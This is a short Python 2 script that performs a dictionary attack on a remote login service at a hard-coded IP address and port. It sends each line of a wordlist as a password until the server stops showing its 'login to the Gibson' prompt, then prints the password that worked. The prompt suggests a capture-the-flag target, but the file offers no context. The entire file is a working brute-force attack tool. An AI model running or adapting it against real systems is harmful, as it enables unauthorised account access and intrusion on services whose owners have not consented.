import socket

#get location of remote computer and service
ip = "54.201.246.241"
port = 1339

#make socket
s = socket.socket()

#use socket to make connection
s.connect((ip,port))

#print s.recv(1000)

passwdfile = open("wordlist.txt", "r")

arr=[]
while True:
    tmp = passwdfile.readline()
    if not tmp: break
    arr.append(tmp)
passwdfile.close()

for l in arr:
    print l
    s.send(l)
    message = s.recv(1000)
    if "Please enter password to login to the Gibson:" not in message: break

print "the password is",l
print message
    
input()
